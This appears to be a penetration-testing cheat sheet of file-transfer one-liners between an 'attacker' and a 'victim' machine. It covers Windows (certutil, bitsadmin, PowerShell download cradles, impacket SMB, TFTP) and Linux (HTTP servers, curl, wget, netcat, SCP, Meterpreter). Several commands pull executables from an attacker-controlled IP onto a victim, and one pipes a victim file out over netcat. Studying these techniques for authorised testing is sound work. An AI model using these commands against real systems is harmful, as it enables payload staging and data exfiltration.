Windows File Transfer
======================

IWR (Invoke-Web Request)
------------------------

Attacker: python -m SimpleHTTPServer 80

Victim: 
nc -lvp 4444
powershell.exe -command iwr -Uri http://192.168.1.2/putty.exe -OutFile C:\Temp\putty.exe "
dir

powershell.exe iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe

powershell
iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
dir

Certutil
--------

Attacker Machine: We can use the same SimpleHTTP Server on port 80 on the attacker machine to send the file from that directory.

Victim Machine: Make use of the following command to download the file from the attacker machine. For the command, you have mentioned the ip-address/file “and then the output file name. The -f in the command generally forces overwrite.

certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
or
certutil -urlcache -split -f http://192.168.1.2/putty.exe putty.exe

Bitsadmin
----------

bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe

Curl
----
Attacker Machine: We can use the same SimpleHTTP Server on port 80 on the attacker machine to send the file from that directory.

Victim Machine: On the victim machine, run the following command to download the file from the attacker machine.

curl http://192.168.1.2/putty.exe -o putty.exe
dir

Wget
----
Attacker Machine: Run the SimpleHTTP Server on port 80 on the attacker machine to send the file from that directory.

Victim Machine: Open Powershell on the windows machine and run the following command. Mention the path to download the file from and then give the output path to save the file putty.exe.

powershell 
wget http://192.168.1.2/putty.exe -OutFile putty.exe
dir

powershell.exe wget http://192.168.1.2/putty.exe -OutFile putty.exe

Powershell
-----------

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/putty.exe', 'putty.exe')

dir

SMB Server Impacket-Smbserver
------------------------------

Attacker Machine: On the attacker, the machine goes to the directory from which the file is to be transferred. Then let’s make use of Impacket-smbserver to share this file from the local machine.
Note: Impacket provides low-level programming access to some packets for certain protocols in the network.
(Run SMB oneliner instead of python server)

impacket-smbserver share $(pwd) -smb2support

impacket-smbserver share /root/Downloads/test -smb2support

Victim Machine:
copy \\192.168.1.2\share\putty.exe
dir
or
net use \\192.168.1.2\share
net use
copy \\192.168.1.2\share\putty.exe
dir

*Using a different Operating system where Impacket is not installed by default----

Attacker Machine: On the attacker, the machine goes to the directory from which the file is to be transferred.
Install: https://www.hackingarticles.in/impacket-guide-smb-msrpc/

python3 smbserver.py share /root/test -smb2support

Victim Machine:

copy \\192.168.1.2\share\putty.exe
dir

TFTP
-----
Open Metasploit
use auxiliary/server/tftp
set srvhost IP
set tftproot "file path /root/file.txt"
exploit

Victim Machine:
tftp -i 192.168.1.2 GET file.txt

FTP (When file name is known only)

Victim Machine:
ftp 192.168.1.5 
get file.txt
dir

LINUX File Transfer
=====================

PHP Web-Server
---------------

Attacker Machine: php -S 0.0.0.0:8080

Victim Machine: On the victim machine’s web browser 
IE: 192.168.1.6:8080/putty.exe

Apache
-------

Attacker Machine: before transferring file through web directories and then move any file into the HTML directory to share it. Then restart the apache service.

root@kali[/Download/Test]- cp putty.exe /var/www/html
service apache2 restart

Victim Machine:
192.168.1.6/putty.exe

Simple HTTP server
-------------------

python -m SimpleHTTPServer
python3 -m http.server 8000

Victim Machine:
192.168.q.6:8000

Curl
-----
curl -O http://192.168.1.6/putty.exe

Wget
-----
wget 192.168.1.6/putty.exe

Netcat
-------
Attacker
nc -lvp 5555 > file.txt
Victim
nc 192.168.1.6 5555 < file.txt

SCP
----
Attacker Machine:
scp file.txt kali@192.168.1.6:/tmp

Victim:
cd /tmp
cat file.txt

SMB-Client
-----------

Attacker
smbclient -L 192.168.1.21 -U raj%123
victim
smbclient  //192.168.1.21/share -U raj%123

Meterpreter
------------

Attacker Machine:
meterpreter> download file.txt /root/Desktop/

FTP
----
Attacker Machine:
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -u jeenali -P 123

Victim Machine:
ftp 192.168.1.5

or browser ftp://192.168.1.5

















































